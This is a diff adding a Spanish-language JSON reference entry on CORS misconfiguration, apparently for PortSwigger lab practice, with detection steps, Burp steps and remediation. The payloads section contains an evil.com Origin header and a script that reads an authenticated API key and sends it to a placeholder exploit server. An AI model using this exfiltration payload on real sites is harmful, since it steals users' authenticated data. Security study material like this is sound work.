@@ -1,0 +1,47 @@
+{
+  "id": "cors",
+  "name": "CORS Misconfiguration",
+  "category": "Client-side",
+  "severity": "Medium",
+  "aka": ["CORS"],
+  "summary": "Una configuración laxa de Cross-Origin Resource Sharing permite que sitios maliciosos lean respuestas autenticadas de la aplicación, exponiendo datos sensibles del usuario.",
+  "where_to_look": [
+    "Respuestas con cabecera Access-Control-Allow-Origin.",
+    "Endpoints de API que devuelven datos sensibles y usan cookies/credenciales."
+  ],
+  "detection": [
+    "Envía un Origin arbitrario y mira si se refleja en Access-Control-Allow-Origin.",
+    "Comprueba si además aparece Access-Control-Allow-Credentials: true (lo más explotable).",
+    "Prueba Origin: null y subdominios para ver si se aceptan."
+  ],
+  "burp_steps": [
+    "En Repeater, añade Origin: https://evil.com y observa el ACAO devuelto.",
+    "Si refleja el Origin y permite credenciales, monta un PoC que haga fetch con credentials.",
+    "Prueba variantes: Origin: null, subdominio.lab, prefijos/sufijos del dominio.",
+    "Aloja el PoC en el exploit server del lab para exfiltrar la respuesta."
+  ],
+  "payloads": {
+    "Cabeceras a probar": [
+      "Origin: https://evil.com",
+      "Origin: null",
+      "Origin: https://lab.evil.com"
+    ],
+    "PoC de exfiltración": [
+      "<script>fetch('https://lab/api/key',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://EXPLOIT-SERVER/?d='+encodeURIComponent(t)))</script>"
+    ]
+  },
+  "commands": [],
+  "remediation": [
+    "No reflejes el Origin dinámicamente; usa una allowlist estricta de orígenes de confianza.",
+    "No combines Access-Control-Allow-Origin: * con credenciales, ni aceptes Origin: null.",
+    "No confíes en validaciones por substring del dominio."
+  ],
+  "portswigger_labs": [
+    {"title": "CORS con ACAO reflejado en orígenes de confianza", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack"},
+    {"title": "CORS que confía en Origin null", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack"}
+  ],
+  "references": [
+    {"title": "PortSwigger — CORS", "url": "https://portswigger.net/web-security/cors"},
+    {"title": "OWASP — CORS", "url": "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"}
+  ]
+}
